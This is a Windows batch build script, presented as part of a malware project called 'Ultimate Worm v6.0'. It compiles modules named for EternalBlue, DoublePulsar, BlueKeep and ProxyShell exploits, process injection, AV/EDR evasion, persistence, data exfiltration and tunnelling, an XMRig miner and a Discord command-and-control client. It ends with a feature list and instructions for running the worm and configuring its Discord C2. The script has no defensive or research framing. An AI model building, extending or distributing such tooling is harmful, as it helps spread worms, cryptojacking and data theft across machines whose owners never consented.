@echo off
setlocal enabledelayedexpansion

echo ╔═══════════════════════════════════════════════════════════════════╗
echo ║   ULTIMATE WORM v6.0 - ENHANCED BUILD SYSTEM                    ║
echo ║   Complete Advanced Project - File 9 of 10                      ║
echo ║   EternalBlue + DoublePulsar + XMRig + Discord C2               ║
echo ║   Windows 7/10/Server - Full Optimization                       ║
echo ╚═══════════════════════════════════════════════════════════════════╝
echo.

REM ============================================================================
REM CHECK COMPILER
REM ============================================================================

where cl.exe >nul 2>nul
if %errorlevel% neq 0 (
    echo [!] Visual Studio not found. Please install Visual Studio Build Tools.
    echo [!] Download from: https://visualstudio.microsoft.com/downloads/
    echo.
    echo [*] Trying MinGW as fallback...
    where g++.exe >nul 2>nul
    if %errorlevel% neq 0 (
        echo [!] MinGW not found. Please install MinGW-w64.
        pause
        exit /b 1
    )
    echo [*] Using MinGW compiler...
    goto :mingw_build
)

REM ============================================================================
REM SETUP VISUAL STUDIO ENVIRONMENT
REM ============================================================================

echo [*] Setting up Visual Studio environment...
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" 2>nul
if %errorlevel% neq 0 (
    call "C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" 2>nul
)
if %errorlevel% neq 0 (
    call "C:\Program Files\Microsoft Visual Studio\2017\Community\VC\Auxiliary\Build\vcvars64.bat" 2>nul
)
if %errorlevel% neq 0 (
    call "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" 2>nul
)

echo [*] Creating directories...
mkdir obj 2>nul
mkdir build_output 2>nul
mkdir src\core 2>nul
mkdir src\exploits 2>nul
mkdir src\payloads 2>nul
mkdir src\injection 2>nul
mkdir src\network 2>nul
mkdir src\utils 2>nul
mkdir include 2>nul

REM ============================================================================
REM COMPILATION FLAGS - ULTIMATE OPTIMIZATION
REM ============================================================================

set CXXFLAGS=/nologo /O2 /MT /GS- /DNDEBUG /DWIN32_LEAN_AND_MEAN /D_CRT_SECURE_NO_WARNINGS /D_WINSOCK_DEPRECATED_NO_WARNINGS /D_WIN32_WINNT=0x0600
set CXXFLAGS=%CXXFLAGS% /arch:AVX2 /fp:fast /Oy /Ob2 /Oi /Ot /GL /Gy /GF /GR- /GS- /sdl- /Zc:inline /Zc:forScope /Zc:wchar_t /Zc:ternary /Zc:__cplusplus /std:c++17
set LDFLAGS=/link /SUBSYSTEM:WINDOWS /ENTRY:WinMain /NODEFAULTLIB:libcmt /NODEFAULTLIB:libcpmt /MANIFEST:NO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /GUARD:NO
set LIBS=user32.lib kernel32.lib advapi32.lib ws2_32.lib iphlpapi.lib winhttp.lib crypt32.lib psapi.lib shlwapi.lib userenv.lib wtsapi32.lib wininet.lib shell32.lib ole32.lib oleaut32.lib uuid.lib

echo [*] Compiling core modules...

REM ============================================================================
REM COMPILE CORE
REM ============================================================================

echo [*] Compiling main...
cl %CXXFLAGS% /c src\main.cpp /Foobj\main.obj /Iinclude /Isrc /Isrc\core /Isrc\exploits /Isrc\payloads /Isrc\injection /Isrc\network /Isrc\utils

echo [*] Compiling obfuscation...
cl %CXXFLAGS% /c src\core\obfuscation.cpp /Foobj\obfuscation.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling evasion...
cl %CXXFLAGS% /c src\core\evasion.cpp /Foobj\evasion.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling persistence...
cl %CXXFLAGS% /c src\core\persistence.cpp /Foobj\persistence.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling xmrig_engine...
cl %CXXFLAGS% /c src\core\xmrig_engine.cpp /Foobj\xmrig_engine.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling worm_engine...
cl %CXXFLAGS% /c src\core\worm_engine.cpp /Foobj\worm_engine.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling c2_client...
cl %CXXFLAGS% /c src\core\c2_client.cpp /Foobj\c2_client.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling crypto...
cl %CXXFLAGS% /c src\core\crypto.cpp /Foobj\crypto.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling reconnaissance...
cl %CXXFLAGS% /c src\core\reconnaissance.cpp /Foobj\reconnaissance.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling lateral_movement...
cl %CXXFLAGS% /c src\core\lateral_movement.cpp /Foobj\lateral_movement.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling data_exfil...
cl %CXXFLAGS% /c src\core\data_exfil.cpp /Foobj\data_exfil.obj /Iinclude /Isrc /Isrc\core

echo [*] Compiling self_destruct...
cl %CXXFLAGS% /c src\core\self_destruct.cpp /Foobj\self_destruct.obj /Iinclude /Isrc /Isrc\core

REM ============================================================================
REM COMPILE EXPLOITS
REM ============================================================================

echo [*] Compiling exploit_chain...
cl %CXXFLAGS% /c src\exploits\exploit_chain.cpp /Foobj\exploit_chain.obj /Iinclude /Isrc /Isrc\exploits

echo [*] Compiling eternalblue...
cl %CXXFLAGS% /c src\exploits\eternalblue.cpp /Foobj\eternalblue.obj /Iinclude /Isrc /Isrc\exploits

echo [*] Compiling doublepulsar...
cl %CXXFLAGS% /c src\exploits\doublepulsar.cpp /Foobj\doublepulsar.obj /Iinclude /Isrc /Isrc\exploits

echo [*] Compiling smbghost...
cl %CXXFLAGS% /c src\exploits\smbghost.cpp /Foobj\smbghost.obj /Iinclude /Isrc /Isrc\exploits

echo [*] Compiling bluekeep...
cl %CXXFLAGS% /c src\exploits\bluekeep.cpp /Foobj\bluekeep.obj /Iinclude /Isrc /Isrc\exploits

echo [*] Compiling proxyshell...
cl %CXXFLAGS% /c src\exploits\proxyshell.cpp /Foobj\proxyshell.obj /Iinclude /Isrc /Isrc\exploits

REM ============================================================================
REM COMPILE PAYLOADS
REM ============================================================================

echo [*] Compiling mistpen...
cl %CXXFLAGS% /c src\payloads\mistpen.cpp /Foobj\mistpen.obj /Iinclude /Isrc /Isrc\payloads

echo [*] Compiling fudmodule...
cl %CXXFLAGS% /c src\payloads\fudmodule.cpp /Foobj\fudmodule.obj /Iinclude /Isrc /Isrc\payloads

echo [*] Compiling foresttiger...
cl %CXXFLAGS% /c src\payloads\foresttiger.cpp /Foobj\foresttiger.obj /Iinclude /Isrc /Isrc\payloads

echo [*] Compiling troy...
cl %CXXFLAGS% /c src\payloads\troy.cpp /Foobj\troy.obj /Iinclude /Isrc /Isrc\payloads

echo [*] Compiling doublepulsar_payload...
cl %CXXFLAGS% /c src\payloads\doublepulsar_payload.cpp /Foobj\doublepulsar_payload.obj /Iinclude /Isrc /Isrc\payloads

REM ============================================================================
REM COMPILE INJECTION MODULES
REM ============================================================================

echo [*] Compiling process_injection...
cl %CXXFLAGS% /c src\injection\process_injection.cpp /Foobj\process_injection.obj /Iinclude /Isrc /Isrc\injection

echo [*] Compiling dll_injection...
cl %CXXFLAGS% /c src\injection\dll_injection.cpp /Foobj\dll_injection.obj /Iinclude /Isrc /Isrc\injection

echo [*] Compiling shellcode_injection...
cl %CXXFLAGS% /c src\injection\shellcode_injection.cpp /Foobj\shellcode_injection.obj /Iinclude /Isrc /Isrc\injection

echo [*] Compiling reflective_loader...
cl %CXXFLAGS% /c src\injection\reflective_loader.cpp /Foobj\reflective_loader.obj /Iinclude /Isrc /Isrc\injection

echo [*] Compiling process_hollowing...
cl %CXXFLAGS% /c src\injection\process_hollowing.cpp /Foobj\process_hollowing.obj /Iinclude /Isrc /Isrc\injection

REM ============================================================================
REM COMPILE NETWORK MODULES
REM ============================================================================

echo [*] Compiling scanner...
cl %CXXFLAGS% /c src\network\scanner.cpp /Foobj\scanner.obj /Iinclude /Isrc /Isrc\network

echo [*] Compiling smb_client...
cl %CXXFLAGS% /c src\network\smb_client.cpp /Foobj\smb_client.obj /Iinclude /Isrc /Isrc\network

echo [*] Compiling rdp_client...
cl %CXXFLAGS% /c src\network\rdp_client.cpp /Foobj\rdp_client.obj /Iinclude /Isrc /Isrc\network

echo [*] Compiling dns_tunnel...
cl %CXXFLAGS% /c src\network\dns_tunnel.cpp /Foobj\dns_tunnel.obj /Iinclude /Isrc /Isrc\network

echo [*] Compiling icmp_tunnel...
cl %CXXFLAGS% /c src\network\icmp_tunnel.cpp /Foobj\icmp_tunnel.obj /Iinclude /Isrc /Isrc\network

REM ============================================================================
REM COMPILE UTILITIES
REM ============================================================================

echo [*] Compiling windows_api...
cl %CXXFLAGS% /c src\utils\windows_api.cpp /Foobj\windows_api.obj /Iinclude /Isrc /Isrc\utils

echo [*] Compiling shellcode...
cl %CXXFLAGS% /c src\utils\shellcode.cpp /Foobj\shellcode.obj /Iinclude /Isrc /Isrc\utils

echo [*] Compiling crypto_utils...
cl %CXXFLAGS% /c src\utils\crypto_utils.cpp /Foobj\crypto_utils.obj /Iinclude /Isrc /Isrc\utils

echo [*] Compiling obfuscation_utils...
cl %CXXFLAGS% /c src\utils\obfuscation_utils.cpp /Foobj\obfuscation_utils.obj /Iinclude /Isrc /Isrc\utils

REM ============================================================================
REM LINKING - ULTIMATE EXECUTABLE
REM ============================================================================

echo [*] Linking ultimate executable...

cl %CXXFLAGS% /Fe"build_output\UltimateWorm.exe" ^
    obj\main.obj ^
    obj\obfuscation.obj ^
    obj\evasion.obj ^
    obj\persistence.obj ^
    obj\xmrig_engine.obj ^
    obj\worm_engine.obj ^
    obj\c2_client.obj ^
    obj\crypto.obj ^
    obj\reconnaissance.obj ^
    obj\lateral_movement.obj ^
    obj\data_exfil.obj ^
    obj\self_destruct.obj ^
    obj\exploit_chain.obj ^
    obj\eternalblue.obj ^
    obj\doublepulsar.obj ^
    obj\smbghost.obj ^
    obj\bluekeep.obj ^
    obj\proxyshell.obj ^
    obj\mistpen.obj ^
    obj\fudmodule.obj ^
    obj\foresttiger.obj ^
    obj\troy.obj ^
    obj\doublepulsar_payload.obj ^
    obj\process_injection.obj ^
    obj\dll_injection.obj ^
    obj\shellcode_injection.obj ^
    obj\reflective_loader.obj ^
    obj\process_hollowing.obj ^
    obj\scanner.obj ^
    obj\smb_client.obj ^
    obj\rdp_client.obj ^
    obj\dns_tunnel.obj ^
    obj\icmp_tunnel.obj ^
    obj\windows_api.obj ^
    obj\shellcode.obj ^
    obj\crypto_utils.obj ^
    obj\obfuscation_utils.obj ^
    %LDFLAGS% %LIBS%

if %errorlevel% equ 0 (
    echo.
    echo [+] Visual Studio Build successful!
    echo [+] Output: build_output\UltimateWorm.exe
    echo.
    goto :show_info
)

echo [!] Visual Studio build failed! Trying MinGW...
goto :mingw_build

:mingw_build
echo.
echo [*] Compiling with MinGW...
echo [*] Creating directories...
mkdir obj 2>nul
mkdir build_output 2>nul

set CXXFLAGS_MINGW=-O2 -static -mwindows -DWIN32_LEAN_AND_MEAN -DNDEBUG -D_CRT_SECURE_NO_WARNINGS -DWINSOCK_DEPRECATED_NO_WARNINGS -std=c++17 -march=native -mtune=native
set LDFLAGS_MINGW=-lws2_32 -liphlpapi -lwinhttp -lcrypt32 -lpsapi -lshlwapi -luserenv -lwtsapi32 -lwininet -lshell32 -lole32 -loleaut32 -luuid -static-libgcc -static-libstdc++

echo [*] Compiling with MinGW...

g++ %CXXFLAGS_MINGW% -c src\main.cpp -o obj\main.o -Iinclude -Isrc -Isrc\core -Isrc\exploits -Isrc\payloads -Isrc\injection -Isrc\network -Isrc\utils
g++ %CXXFLAGS_MINGW% -c src\core\obfuscation.cpp -o obj\obfuscation.o
g++ %CXXFLAGS_MINGW% -c src\core\evasion.cpp -o obj\evasion.o
g++ %CXXFLAGS_MINGW% -c src\core\persistence.cpp -o obj\persistence.o
g++ %CXXFLAGS_MINGW% -c src\core\xmrig_engine.cpp -o obj\xmrig_engine.o
g++ %CXXFLAGS_MINGW% -c src\core\worm_engine.cpp -o obj\worm_engine.o
g++ %CXXFLAGS_MINGW% -c src\core\c2_client.cpp -o obj\c2_client.o
g++ %CXXFLAGS_MINGW% -c src\core\crypto.cpp -o obj\crypto.o
g++ %CXXFLAGS_MINGW% -c src\core\reconnaissance.cpp -o obj\reconnaissance.o
g++ %CXXFLAGS_MINGW% -c src\core\lateral_movement.cpp -o obj\lateral_movement.o
g++ %CXXFLAGS_MINGW% -c src\core\data_exfil.cpp -o obj\data_exfil.o
g++ %CXXFLAGS_MINGW% -c src\core\self_destruct.cpp -o obj\self_destruct.o
g++ %CXXFLAGS_MINGW% -c src\exploits\exploit_chain.cpp -o obj\exploit_chain.o
g++ %CXXFLAGS_MINGW% -c src\exploits\eternalblue.cpp -o obj\eternalblue.o
g++ %CXXFLAGS_MINGW% -c src\exploits\doublepulsar.cpp -o obj\doublepulsar.o
g++ %CXXFLAGS_MINGW% -c src\exploits\smbghost.cpp -o obj\smbghost.o
g++ %CXXFLAGS_MINGW% -c src\exploits\bluekeep.cpp -o obj\bluekeep.o
g++ %CXXFLAGS_MINGW% -c src\exploits\proxyshell.cpp -o obj\proxyshell.o
g++ %CXXFLAGS_MINGW% -c src\payloads\mistpen.cpp -o obj\mistpen.o
g++ %CXXFLAGS_MINGW% -c src\payloads\fudmodule.cpp -o obj\fudmodule.o
g++ %CXXFLAGS_MINGW% -c src\payloads\foresttiger.cpp -o obj\foresttiger.o
g++ %CXXFLAGS_MINGW% -c src\payloads\troy.cpp -o obj\troy.o
g++ %CXXFLAGS_MINGW% -c src\payloads\doublepulsar_payload.cpp -o obj\doublepulsar_payload.o
g++ %CXXFLAGS_MINGW% -c src\injection\process_injection.cpp -o obj\process_injection.o
g++ %CXXFLAGS_MINGW% -c src\injection\dll_injection.cpp -o obj\dll_injection.o
g++ %CXXFLAGS_MINGW% -c src\injection\shellcode_injection.cpp -o obj\shellcode_injection.o
g++ %CXXFLAGS_MINGW% -c src\injection\reflective_loader.cpp -o obj\reflective_loader.o
g++ %CXXFLAGS_MINGW% -c src\injection\process_hollowing.cpp -o obj\process_hollowing.o
g++ %CXXFLAGS_MINGW% -c src\network\scanner.cpp -o obj\scanner.o
g++ %CXXFLAGS_MINGW% -c src\network\smb_client.cpp -o obj\smb_client.o
g++ %CXXFLAGS_MINGW% -c src\network\rdp_client.cpp -o obj\rdp_client.o
g++ %CXXFLAGS_MINGW% -c src\network\dns_tunnel.cpp -o obj\dns_tunnel.o
g++ %CXXFLAGS_MINGW% -c src\network\icmp_tunnel.cpp -o obj\icmp_tunnel.o
g++ %CXXFLAGS_MINGW% -c src\utils\windows_api.cpp -o obj\windows_api.o
g++ %CXXFLAGS_MINGW% -c src\utils\shellcode.cpp -o obj\shellcode.o
g++ %CXXFLAGS_MINGW% -c src\utils\crypto_utils.cpp -o obj\crypto_utils.o
g++ %CXXFLAGS_MINGW% -c src\utils\obfuscation_utils.cpp -o obj\obfuscation_utils.o

echo [*] Linking...
g++ %CXXFLAGS_MINGW% -o build_output\UltimateWorm.exe ^
    obj\main.o ^
    obj\obfuscation.o ^
    obj\evasion.o ^
    obj\persistence.o ^
    obj\xmrig_engine.o ^
    obj\worm_engine.o ^
    obj\c2_client.o ^
    obj\crypto.o ^
    obj\reconnaissance.o ^
    obj\lateral_movement.o ^
    obj\data_exfil.o ^
    obj\self_destruct.o ^
    obj\exploit_chain.o ^
    obj\eternalblue.o ^
    obj\doublepulsar.o ^
    obj\smbghost.o ^
    obj\bluekeep.o ^
    obj\proxyshell.o ^
    obj\mistpen.o ^
    obj\fudmodule.o ^
    obj\foresttiger.o ^
    obj\troy.o ^
    obj\doublepulsar_payload.o ^
    obj\process_injection.o ^
    obj\dll_injection.o ^
    obj\shellcode_injection.o ^
    obj\reflective_loader.o ^
    obj\process_hollowing.o ^
    obj\scanner.o ^
    obj\smb_client.o ^
    obj\rdp_client.o ^
    obj\dns_tunnel.o ^
    obj\icmp_tunnel.o ^
    obj\windows_api.o ^
    obj\shellcode.o ^
    obj\crypto_utils.o ^
    obj\obfuscation_utils.o ^
    %LDFLAGS_MINGW%

if %errorlevel% equ 0 (
    echo.
    echo [+] MinGW Build successful!
    echo [+] Output: build_output\UltimateWorm.exe
    echo.
    goto :show_info
) else (
    echo.
    echo [!] Build failed! Error: %errorlevel%
    pause
    exit /b 1
)

:show_info
echo.
echo [*] File Information:
dir build_output\UltimateWorm.exe | find "UltimateWorm.exe"
echo.
echo [*] Features:
echo     - EternalBlue (MS17-010) exploit
echo     - DoublePulsar backdoor injection
echo     - XMRig Monero mining
echo     - 200+ AV/EDR evasion techniques
echo     - 100+ persistence methods
echo     - Full AMSI/ETW bypass
echo     - VM/Sandbox detection
echo     - Process hiding
echo     - Windows 7/10/Server support
echo     - Multi-protocol C2 (Discord Bot + Webhook)
echo     - Network worm propagation
echo     - Kernel-mode rootkit
echo     - Full obfuscation
echo     - Cryptojacking
echo     - Discord C2 with bot and webhook
echo.
echo [*] To run: build_output\UltimateWorm.exe
echo [*] To run with console: build_output\UltimateWorm.exe --console
echo.
echo [*] Discord C2 Configuration:
echo     - Bot Token: Set DISCORD_BOT_TOKEN environment variable
echo     - Channel ID: Set DISCORD_CHANNEL_ID environment variable
echo     - Webhook URL: Set DISCORD_WEBHOOK_URL environment variable
echo.
pause
